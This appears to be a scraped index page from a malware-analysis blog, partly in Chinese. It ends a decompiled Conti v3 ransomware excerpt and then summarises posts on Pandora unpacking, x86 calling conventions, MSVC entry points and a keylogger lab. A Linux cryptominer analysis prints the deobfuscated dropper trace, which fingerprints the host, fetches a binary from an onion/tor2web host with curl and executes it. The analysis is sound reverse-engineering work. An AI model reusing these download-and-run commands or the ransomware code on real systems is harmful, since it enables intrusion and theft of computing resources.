class="line">					pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				ScanHosts();</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">					pExitThread(EXIT_FAILURE);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				IsTimerActivated = FALSE;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pDeleteTimerQueue(hTimerQueue);</span><br><span class="line">	pExitThread(EXIT_SUCCESS);</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Reference:</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/_fs/">MSDN</a></p>
<p><a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/g-fact-70/">Critical Section in Synchronization</a></p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-18</span><i class="fa fa-tag"></i><a class="tag" href="/tags/Ransomeware-Conti-v3/" title="Ransomeware,Conti v3">Ransomeware,Conti v3 </a><span class="leancloud_visitors"></span><span>About 3582 words, 11 min 56 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/13/Pandora-Ransomeware-fla-unpack/">Pandora-Ransomeware-fla-unpack</a></h3></div><div class="post-content"><div class="card"><p><h1 id="Pandora-Ransomware"><a href="#Pandora-Ransomware" class="headerlink" title="Pandora Ransomware"></a>Pandora Ransomware</h1><p>[TOC]</p>
<h2 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h2><p>First of all, I love oalabs. Below of code is copied from his research, and I get a lot from just repeat it. And maybe there are also bogus-control-flow in this sample however.</p>
<p>Sample: <code>5b56c5d86347e164c6e571c86dbf5b1535eae6b979fede6ed66b01e79ea33b7b</code></p>
<p>Unpacked sample: <code>2619862c382d3e375f13f3859c6ab44db1a4bce905b4a617df2390fbf36902e7</code> on the malshare(by the oalabs)</p>
<p><strong>References</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://synthesis.to/2021/03/03/flattening_detection.html">Control Flow Flattening</a></li>
<li><a target="_blank" rel="noopener" href="https://research.openanalysis.net/pandora/ransomware/malware/unpacking/dumpulator/emulation/2022/03/19/]https://blog.quarkslab.com/deobfuscation-recovering-an-ollvm-protected-program.html">Deobfuscation - Recovering an ollvm</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/mrexodia/dumpulator">dumpulator</a></li>
<li><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/112">Control Flow Unflattening</a></li>
<li><a target="_blank" rel="noopener" href="https://malshare.com/sample.php?action=detail&hash=5b56c5d86347e164c6e571c86dbf5b1535eae6b979fede6ed66b01e79ea33b7b">malshare</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=SulC2l1Dvbo&t=1s">oalabs</a></li>
</ul></p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-13</span><i class="fa fa-tag"></i><a class="tag" href="/tags/ollvm-dumpulator-ransomeware/" title="ollvm dumpulator ransomeware">ollvm dumpulator ransomeware </a><span class="leancloud_visitors"></span><span>About 3456 words, 11 min 31 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/07/calling-convention/">calling-convention</a></h3></div><div class="post-content"><div class="card"><p><h1 id="Calling-Conventions"><a href="#Calling-Conventions" class="headerlink" title="Calling Conventions"></a>Calling Conventions</h1><p>There are different calling conventions for different operating systems <strong>or</strong> different bits of system<br><strong>or</strong> you compile with the vs (or others)</p>
<ul>
<li>Different conventions based on processor,OS,and Language Describe how are passed to functions</li>
<li>Describe how are returned from functions</li>
<li>Describe if the caller or callee <code>clean the stack</code></li>
<li>Resonsible for function and<code>prologue</code>and<code>epilogue</code></li>
</ul>
<h2 id="Windows-x86-Calling-Convention"><a href="#Windows-x86-Calling-Convention" class="headerlink" title="Windows x86 Calling Convention"></a>Windows x86 Calling Convention</h2><table>
<thead>
<tr>
<th align="left">Keyword</th>
<th align="left">Stack cleanup</th>
<th align="left">Parameter passing</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/cdecl?view=msvc-170">__cdecl</a></td>
<td align="left">Caller</td>
<td align="left">Pushes parameters on the stack, in reverse order (right to left)</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/clrcall?view=msvc-170">__clrcall</a></td>
<td align="left">n&#x2F;a</td>
<td align="left">Load parameters onto CLR expression stack in order (left to right).</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/stdcall?view=msvc-170">__stdcall</a></td>
<td align="left">Callee</td>
<td align="left">Pushes parameters on the stack, in reverse order (right to left)</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/fastcall?view=msvc-170">__fastcall</a></td>
<td align="left">Callee</td>
<td align="left">Stored in registers, then pushed on stack</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/thiscall?view=msvc-170">__thiscall</a></td>
<td align="left">Callee</td>
<td align="left">Pushed on stack; <strong><code>this</code></strong> pointer stored in ECX</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/vectorcall?view=msvc-170">__vectorcall</a></td>
<td align="left">Callee</td>
<td align="left">Stored in registers, then pushed on stack in reverse order (right to left)</td>
</tr>
</tbody></table>
<ul>
<li>All arguments are widened to 32 bits(DWORD)</li>
<li>Return value is widened to 32 bits(DWORD)</li>
<li>Return values up to 32 bits are returned to <code>eax</code> register</li>
<li>Return values of 64 bit size(QWORD) are returned in EDX:EAX(The main value is in the EDX Register)</li>
<li>Return Structures are returned by reference with a pointer in EAX</li>
<li>Registers ESI,EDI,EBX,and EBP are restored(non-volatile)</li>
<li>MSDN is your friend</li>
</ul>
<h3 id="cdecl"><a href="#cdecl" class="headerlink" title="__cdecl"></a><code>__cdecl</code></h3><ul>
<li><p>Default calling convention for c and c++</p>
</li>
<li><p>Arguments are passed on the stack(pushed right-to-left)</p>
</li>
<li><p>Called is responsible for stack cleanup will (cdecl will clean the stack )</p>
<ul>
<li><p>this is important when there are variadic functions,so function doesn’t</p>
<p>worry about stack cleaning.</p>
</li>
</ul>
</li>
<li><p>Supports varag(variadic)functions</p>
</li>
</ul>
<p>Example code below:</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220407182649772.png" alt="image-20220407182649772"></p>
<p>then we can get follow code with ida</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220407182717320-20220407202633645-20220407202659160.png" alt="image-20220407182717320"></p>
<ul>
<li>sub_401090 is the hello1 function</li>
<li>sub_401000 is the addingNumberVariadic function which is variadic<ul>
<li>notice that caller clean the stack when the function return</li>
</ul>
</li>
</ul>
<h3 id="stdcall"><a href="#stdcall" class="headerlink" title="__stdcall"></a>__stdcall</h3><p>The <strong><code>__stdcall</code></strong> calling convention is used to call Win32 API functions. <code>The callee cleans the stack</code>, so the compiler makes <code>vararg</code> functions <strong><code>__cdecl</code></strong>. Functions that use this calling convention require a function prototype. The <strong><code>__stdcall</code></strong> modifier is Microsoft-specific.</p>
<table>
<thead>
<tr>
<th>Element</th>
<th>Implementation</th>
</tr>
</thead>
<tbody><tr>
<td>Argument-passing order</td>
<td>Right to left.</td>
</tr>
<tr>
<td>Argument-passing convention</td>
<td>By value, unless a pointer or reference type is passed.</td>
</tr>
<tr>
<td>Stack-maintenance responsibility</td>
<td>Called function pops its own arguments from the stack.</td>
</tr>
<tr>
<td>Name-decoration convention</td>
<td>An underscore (<code>_</code>) is prefixed to the name. The name is followed by the at sign (<code>@</code>) followed by the number of bytes (in decimal) in the argument list. Therefore, the function declared as <code>int func( int a, double b )</code> is decorated as follows: <code>_func@12</code></td>
</tr>
</tbody></table>
<h3 id="fastcall"><a href="#fastcall" class="headerlink" title="__fastcall"></a>__fastcall</h3><p>The <strong><code>__fastcall</code></strong> calling convention specifies that arguments to functions are to be passed in registers, when possible. This calling convention only applies to the x86 architecture. The following list shows the implementation of this calling convention.</p>
<table>
<thead>
<tr>
<th align="left">Element</th>
<th align="left">Implementation</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Argument-passing order</td>
<td align="left">The first two DWORD or smaller arguments that are found in the argument list from left to right are passed in ECX and EDX registers; all other arguments are passed on the stack from right to left.</td>
</tr>
<tr>
<td align="left">Stack-maintenance responsibility</td>
<td align="left">Called function pops the arguments from the stack.</td>
</tr>
<tr>
<td align="left">Name-decoration convention</td>
<td align="left">At sign (@) is prefixed to names; an at sign followed by the number of bytes (in decimal) in the parameter list is suffixed to names.</td>
</tr>
<tr>
<td align="left">Case-translation convention</td>
<td align="left">No case translation performed.</td>
</tr>
</tbody></table>
<h3 id="thiscall"><a href="#thiscall" class="headerlink" title="__thiscall"></a>__thiscall</h3><p>The <strong>Microsoft-specific</strong> <strong><code>__thiscall</code></strong> calling convention is used on C++ class member functions on the x86 architecture. It’s the default calling convention used by member functions that don’t use variable arguments (<code>vararg</code> functions).</p>
<p>Under __thiscall, <code>the callee cleans the stack</code>, which is impossible for <code>vararg functions</code>. Arguments are pushed on the stack from right to left. <u>The <strong><code>this</code></strong> pointer is passed via register ECX, and not on the stack</u>.</p>
<blockquote>
<p><code>vararg</code> member functions use the <strong><code>__cdecl</code></strong> calling convention. All function arguments are pushed on the stack, with the <strong><code>this</code></strong> pointer placed on the stack last.</p>
</blockquote>
<p>Because this calling convention applies only to C++, it doesn’t have a C name decoration scheme.</p>
<p>When you define a non-static class member function out-of-line, specify the calling convention modifier only in the declaration. You don’t have to specify it again on the out-of-line definition. The compiler uses the calling convention specified during declaration at the point of definition.</p>
<h3 id="vectorcall"><a href="#vectorcall" class="headerlink" title="__vectorcall"></a>__vectorcall</h3><p>The <strong><code>__vectorcall</code></strong> calling convention specifies that arguments to functions are to be passed in registers. <strong><code>__vectorcall</code></strong> uses more registers for arguments than <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/fastcall?view=msvc-170"><code>__fastcall</code></a> or the default <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">x64 calling convention</a>(rcx rdx r7 r8 [rsp+[size of arg]) use. The <strong><code>__vectorcall</code></strong> calling convention is only supported in native code on x86 and x64 processors that<u>  include Streaming SIMD Extensions 2 (SSE2) and above.</u> Use <strong><code>__vectorcall</code></strong> to speed functions that pass several floating-point or SIMD vector arguments and perform operations that take advantage of the arguments loaded in registers. The following list shows the features that are common to the x86 and x64 implementations of <strong><code>__vectorcall</code></strong>. The differences are explained later in this article.</p>
<blockquote>
<p>to be continue one day</p>
</blockquote>
<p>Reference:</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/argument-passing-and-naming-conventions?view=msvc-170">https://docs.microsoft.com/en-us/cpp/cpp/argument-passing-and-naming-conventions?view=msvc-170</a></p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-07</span><i class="fa fa-tag"></i><span class="leancloud_visitors"></span><span>About 834 words, 2 min 46 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/04/oep-tricks/">oep_tricks</a></h3></div><div class="post-content"><div class="card"><p><h1 id="OEP-tricks"><a href="#OEP-tricks" class="headerlink" title="OEP tricks"></a>OEP tricks</h1><h2 id="intro"><a href="#intro" class="headerlink" title="intro"></a>intro</h2><p>Why is the PE Entry Point Not the same as Main Understanding <code>__security__init__cookie</code>and<code>scrt_common_main_seh</code></p>
<p>在第一次学习如何对 Windows 二进制文件进行逆向工程时，尤其是在使用调试器时，这是一个需要理解的重要概念。 当调试器在 PE 入口点上中断时，通常会让人感到困惑，只是为了找到一些与二进制文件的主要功能无关的代码。 此代码通常称为<code>boilerplate</code>代码，由 MSVC 编译器自动插入。 这对我们识别代码和方向有很大帮助。</p>
<h3 id="MSVC-console-Application-Entry-point"><a href="#MSVC-console-Application-Entry-point" class="headerlink" title="MSVC console Application Entry point"></a>MSVC console Application Entry point</h3><p>The Entry Point on an MSVC console application servers two purples .</p>
<ul>
<li>calls the <code>__security__init_cookie</code> function </li>
<li>jumps to the <code>__scrt_common_main_seh</code>thunk<ul>
<li>The __scrt_common_main_seh thunk then performs some setup for the binary including some structured exception handler (SEH) setup and then calls  main.</li>
</ul>
</li>
</ul>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220403215142052.png" alt="image-20220403215142052"></p>
<h3 id="security-init-cookie"><a href="#security-init-cookie" class="headerlink" title="__security_init_cookie"></a>__security_init_cookie</h3><blockquote>
<p>The purpose of this cookie is best described by <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/security-init-cookie?view=msvc-170">MSDN</a></p>
<p>全局安全 cookie 用于在使用 &#x2F;GS（缓冲区安全检查）编译的代码和使用异常处理的代码中进行缓冲区溢出保护。</p>
<p>在进入受溢出保护的函数时，cookie 被放入堆栈，而在退出时，堆栈上的值与全局 cookie 进行比较。 它们之间的任何差异都表明发生了缓冲区溢出并导致程序立即终止。</p>
</blockquote>
<p>Normally, <strong><code>__security_init_cookie</code></strong> is called by the CRT when it’s initialized. If you bypass CRT initialization—for example, if you use <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/build/reference/entry-entry-point-symbol?view=msvc-170"><code>/ENTRY</code></a> to specify an entry-point—then you must call </p>
<p><strong><code>__security_init_cookie</code></strong> yourself. If <strong><code>__security_init_cookie</code></strong> isn’t called, the global security cookie is set to a default value and  buffer overrun protection is compromised. Because an attacker can  exploit this default cookie value to defeat the buffer overrun checks,  we recommend that you always call </p>
<p><strong><code>__security_init_cookie</code></strong> when you define your own entry point.</p>
<blockquote>
<p>we can use the opcode <code>48 89 5C 24 20 55 48 8B EC 48 83 EC 20</code> to find the <code>__security_init_cookie</code></p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220403230636976.png" alt="image-20220403230636976"></p>
</blockquote>
<p>The call to <strong><code>__security_init_cookie</code></strong> must be made before any overrun-protected function is entered; otherwise a  spurious buffer overrun will be detected. For more information, see <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/error-messages/tool-errors/c-runtime-error-r6035?view=msvc-170">C Runtime Error R6035</a>.</p>
<h3 id="scrt-common-main-seh"><a href="#scrt-common-main-seh" class="headerlink" title="__scrt_common_main_seh"></a>__scrt_common_main_seh</h3><p>Looking at this code without labels (for example in x64dbg) it can be confusing to identify where main is. Luckily MSVC console applications all have the same main function prototype.</p>
<blockquote>
<p>*main(int argc, const char **argv, const char *<em>envp)</em></p>
</blockquote>
<p>This function prototype can be used to identify the call to main in __scrt_common_main_seh, simply by looking for the three arguments that are passed to main: <em>argc</em>, <em>argv</em>, <em>envp</em>.</p>
<ul>
<li><p>In 64-bit binaries these arguments are compiled into a series of three <em>mov</em> instructions moving the arguments into the registers <code>RCX, RDX, R8</code></p>
<p> <img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220403225145892.png" alt="image-20220403225145892"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4C 8B C7                mov     r8, rdi         ; envp</span><br><span class="line">48 8B D3                mov     rdx, rbx        ; argv</span><br><span class="line">8B 08                   mov     ecx, [rax]      ; argc</span><br></pre></td></tr></table></figure>

</li>
<li><p>In 32-bit binaries these arguments are compiled into a series of three <em>push</em> instructions pushing the arguments onto the stack.</p>
<p> <img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220403225150632.png" alt="image-20220403225150632"></p>
</li>
</ul>
<blockquote>
<p>！！！！！！These patterns can be relied on to identify main. ！！！！！！！</p>
</blockquote>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-04</span><i class="fa fa-tag"></i><a class="tag" href="/tags/msvc/" title="msvc">msvc </a><span class="leancloud_visitors"></span><span>About 637 words, 2 min 7 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/01/keylog/">keylog</a></h3></div><div class="post-content"><div class="card"><p><blockquote>
<p>样本来源：lab03-03</p>
<p>md5: e2bf42217a67e46433da8b6f4507219e</p>
</blockquote>
<p>动态解密资源里的PE后得到了keylog的代码部分。这里不写。</p>
<h2 id="keylog-Analysis"><a href="#keylog-Analysis" class="headerlink" title="keylog Analysis"></a>keylog Analysis</h2><p>通过伪代码我可以很清楚得看到keylog的几步</p>
<ul>
<li>FindWindowA</li>
<li>ShowWindow</li>
<li>GetModuleHandleA</li>
<li>SetWindowHookExA</li>
<li>unhookWindowsHookEx</li>
</ul></p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-01</span><i class="fa fa-tag"></i><span class="leancloud_visitors"></span><span>About 952 words, 3 min 10 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/03/29/malware/"></a></h3></div><div class="post-content"><div class="card"><p><h1 id="mining-Virus-Analysis"><a href="#mining-Virus-Analysis" class="headerlink" title="mining Virus Analysis"></a>mining Virus Analysis</h1><p>md5: eeb8f9ae60c73f84ff85bbeab9c0b6ee</p>
<p>filename: .systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6</p>
<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h3><p>sh文件，简单易懂的base64混淆</p>
<p><img src="/malware.assets/image-20220329175059573.png" alt="image-20220329175059573"></p>
<p>解密后得到脚本step-2</p>
<h3 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h3><ol>
<li><p><code>exec &amp;&gt;/dev/null</code>不允许输出</p>
</li>
<li><p><code>export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</code>设置环境变量</p>
</li>
<li><p>&#96;&#96;&#96;<br>┌──(kali㉿kali)-[~]<br>└─$ grep x:$(id -u): &#x2F;etc&#x2F;passwd|cut -d: -f6<br>&#x2F;home&#x2F;kali</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">4. curl参数设置，这边curl携带的参数为`curl -4fsSLkA- -m200`</span><br><span class="line"></span><br><span class="line">   `-4`(`--ipv4` Resolve names to IPv4 addresses)</span><br><span class="line"></span><br><span class="line">   `--fail`,`--silent`,`--show-error`(Show error even when -s is used),</span><br><span class="line"></span><br><span class="line">   `-L`(`--location` follow the direction)</span><br><span class="line"></span><br><span class="line">   `-k`(`--insecure` Allow insecure server connections),</span><br><span class="line"></span><br><span class="line">   `-A`(`--user-agent &lt;name&gt;`Send User-Agent &lt;name&gt; to server)</span><br><span class="line"></span><br><span class="line">    `-m`(`--max-time` &lt;fractional seconds&gt; Maximum time allowed for transfer)</span><br><span class="line"></span><br><span class="line">5. 设置了三个函数`u`,`sockz`,`fexe`，太多了，不想看了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">暴力解决sh，我们得到如下执行顺序</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>export PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;usr&#x2F;games:&#x2F;home&#x2F;kali:&#x2F;bin:&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin</li>
<li>PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;usr&#x2F;games:&#x2F;home&#x2F;kali:&#x2F;bin:&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin</li>
</ul>
<p>++ cut -d: -f6<br>+++ id -u<br>++ grep x:1000: &#x2F;etc&#x2F;passwd</p>
<ul>
<li>d&#x3D;&#x2F;home&#x2F;kali</li>
</ul>
<p>++ echo ‘curl -4fsSLkA- -m200’</p>
<ul>
<li>c&#x3D;’curl -4fsSLkA- -m200’</li>
</ul>
<p>++ echo 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad</p>
<ul>
<li>t&#x3D;5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad</li>
<li>for h in tor2web.in tor2web.it</li>
</ul>
<p>++ head -n 1 &#x2F;tmp&#x2F;.X11-unix&#x2F;01<br>head: cannot open ‘&#x2F;tmp&#x2F;.X11-unix&#x2F;01’ for reading: No such file or directory</p>
<ul>
<li>ls &#x2F;proc&#x2F;&#x2F;status<br>ls: cannot access ‘&#x2F;proc&#x2F;&#x2F;status’: No such file or directory</li>
<li>fexe</li>
<li>for i in . $HOME &#x2F;usr&#x2F;bin $d &#x2F;var&#x2F;tmp</li>
<li>echo exit</li>
<li>chmod +x .&#x2F;i</li>
<li>cd .</li>
<li>.&#x2F;i</li>
<li>break</li>
<li>u 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.tor2web.in</li>
<li>sockz</li>
<li>n&#x3D;(doh.this.web.id doh.post-factum.tk dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh-fi.blahdns.com fi.doh.dns.snopyta.org resolver-eu.lelux.fi doh.li dns.digitale-gesellschaft.ch)</li>
</ul>
<p>++ echo ‘dns-query?name&#x3D;relay.tor2socks.in’</p>
<ul>
<li>p&#x3D;’dns-query?name&#x3D;relay.tor2socks.in’</li>
</ul>
<p>++ grep -oE ‘\b([0-9]{1,3}.){3}[0-9]{1,3}\b’<br>++ curl -4fsSLkA- -m200 ‘<a target="_blank" rel="noopener" href="https://doh.li/dns-query?name=relay.tor2socks.in&#39;">https://doh.li/dns-query?name=relay.tor2socks.in&#39;</a><br>++ grep -Ev ‘[.]0’<br>++ tr ‘ ‘ ‘\n’<br>++ sort -uR<br>++ head -n 1<br>curl: (35) OpenSSL SSL_connect: Connection reset by peer in connection to doh.li:443 </p>
<ul>
<li>s&#x3D;</li>
</ul>
<p>++ uname -m</p>
<ul>
<li>f&#x3D;&#x2F;int.x86_64</li>
</ul>
<p>++ date<br>++ md5sum<br>++ cut -f1 -d-</p>
<ul>
<li>x&#x3D;’.&#x2F;90aab6fe6a62477d35a888699d973c67  ‘</li>
</ul>
<p>++ curl -4fsSLk checkip.amazonaws.com<br>++ whoami<br>++ uname -m<br>++ uname -n<br>++ ip a<br>++ grep ‘inet ‘<br>++ awk ‘{print $2}’<br>++ awk ‘{print $1}’<br>++ md5sum<br>++ base64 -w0<br>++ crontab -l<br>no crontab for kali</p>
<ul>
<li>r&#x3D;xx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_</li>
<li>curl -4fsSLkA- -m200 -x socks5h:&#x2F;&#x2F;:9050 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.onion&#x2F;int.x86_64 -o.&#x2F;90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_<br>curl: (5) Unsupported proxy syntax in ‘socks5h:&#x2F;&#x2F;:9050’</li>
<li>curl -4fsSLkA- -m200 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.tor2web.in&#x2F;int.x86_64 -o.&#x2F;90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_</li>
<li>echo .socks5h:&#x2F;&#x2F;:9050 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.onion&#x2F;int.x86_64 -o.&#x2F;90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_<br>.socks5h:&#x2F;&#x2F;:9050 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.onion&#x2F;int.x86_64 -o.&#x2F;90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_</li>
<li>chmod +x .&#x2F;90aab6fe6a62477d35a888699d973c67</li>
<li>.&#x2F;90aab6fe6a62477d35a888699d973c67</li>
</ul>
<p>++ head -n 1 &#x2F;tmp&#x2F;.X11-unix&#x2F;01</p>
<ul>
<li>ls &#x2F;proc&#x2F;266947&#x2F;status<br>&#x2F;proc&#x2F;266947&#x2F;status</li>
</ul>
<p>++ head -n 1 &#x2F;tmp&#x2F;.X11-unix&#x2F;01</p>
<ul>
<li>ls &#x2F;proc&#x2F;266947&#x2F;status<br>&#x2F;proc&#x2F;266947&#x2F;status</li>
<li>for h in tor2web.in tor2web.it</li>
</ul>
<p>++ head -n 1 &#x2F;tmp&#x2F;.X11-unix&#x2F;01</p>
<ul>
<li>ls &#x2F;proc&#x2F;266947&#x2F;status<br>&#x2F;proc&#x2F;266947&#x2F;status</li>
<li>break<br>&#96;&#96;&#96;</li>
</ul>
<p>部分命令需要提权，linux病毒分析这块没学过，后面肯定不跟下去了。以后有机会再分析。</p>
<p><img src="/malware.assets/image-20220329185108458.png" alt="image-20220329185108458"></p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-03-29</span><i class="fa fa-tag"></i><span class="leancloud_visitors"></span><span>About 1107 words, 3 min 41 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/03/29/mining-sh-analysis/">mining-sh-analysis</a></h3></div><div class="post-content"><div class="card"><p><h1 id="mining-Virus-Analysis"><a href="#mining-Virus-Analysis" class="headerlink" title="mining Virus Analysis"></a>mining Virus Analysis</h1><p>md5: eeb8f9ae60c73f84ff85bbeab9c0b6ee</p>
<p>filename: .systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6</p></p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-03-29</span><i class="fa fa-tag"></i><a class="tag" href="/tags/linux/" title="linux">linux </a><span class="leancloud_visitors"></span><span>About 1107 words, 3 min 41 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/03/23/about/">about</a></h3></div><div class="post-content"><div class="card"><p></p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-03-23</span><i class="fa fa-tag"></i><span class="leancloud_visitors"></span><span>About 0 words, 0 sec  read</span></div></div></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/page/2/">Next</a></li></ul></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper 